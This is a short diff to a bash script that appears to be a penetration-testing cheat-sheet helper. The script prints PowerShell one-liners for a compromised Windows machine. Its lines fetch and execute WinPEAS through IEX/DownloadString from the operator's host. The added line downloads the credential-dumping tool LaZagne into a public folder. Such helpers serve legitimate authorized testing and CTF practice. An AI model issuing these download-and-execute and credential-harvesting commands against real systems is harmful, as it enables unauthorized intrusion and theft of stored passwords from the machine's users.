@@ -97,6 +97,7 @@ select interface in $interfaces; do
         echo "$(tput setaf 1)  3.Enum: WinPEAS  $(tput sgr0)"
         echo "$(tput setaf 3)  IEX(New-Object System.Net.WebClient).DownloadString('http://$chosen_ip:$port/enum/winPEAS.ps1') $(tput sgr0)"
         echo "$(tput setaf 3)  (New-Object System.Net.WebClient).DownloadFile('http://$chosen_ip:$port/enum/winPEASany.exe','C:\Users\Public\Downloads\winPEASany.exe') $(tput sgr0)"
+        echo "$(tput setaf 3)  (New-Object System.Net.WebClient).DownloadFile('http://$chosen_ip:$port/enum/LaZagne.exe','C:\Users\Public\Downloads\LaZagne.exe') $(tput sgr0)"
 
         echo ""
         echo "$(tput setaf 1)  4.AD Enum  $(tput sgr0)"
